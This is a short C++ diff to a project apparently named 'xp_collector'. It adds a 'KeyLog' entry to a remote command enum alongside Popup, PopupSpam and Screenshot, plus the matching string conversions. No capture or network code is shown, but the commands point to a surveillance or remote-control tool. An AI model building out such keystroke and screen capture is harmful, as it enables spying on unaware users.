@@ -7,7 +7,8 @@ namespace xp_collector {
 enum class CommandType {
 	Popup,
 	PopupSpam,
-	Screenshot
+	Screenshot,
+	KeyLog
 };
 
 inline std::string to_string(CommandType val)
@@ -16,6 +17,7 @@ inline std::string to_string(CommandType val)
 	case CommandType::Popup: return "Popup";
 	case CommandType::PopupSpam: return "PopupSpam";
 	case CommandType::Screenshot: return "Screenshot";
+	case CommandType::KeyLog: return "KeyLog";
 	default: throw std::invalid_argument("Unmapped to_string enum in CommandType");
 	}
 }
@@ -25,6 +27,7 @@ inline CommandType ct_from_string(const std::string& val)
 	if ("Popup" == val) return CommandType::Popup;
 	if ("PopupSpam" == val) return CommandType::PopupSpam;
 	if ("Screenshot" == val) return CommandType::Screenshot;
+	if ("KeyLog" == val) return CommandType::KeyLog;
 	throw std::invalid_argument("Invalid argument '" + val + "' when trying to parse CommandType enum");
 }
 
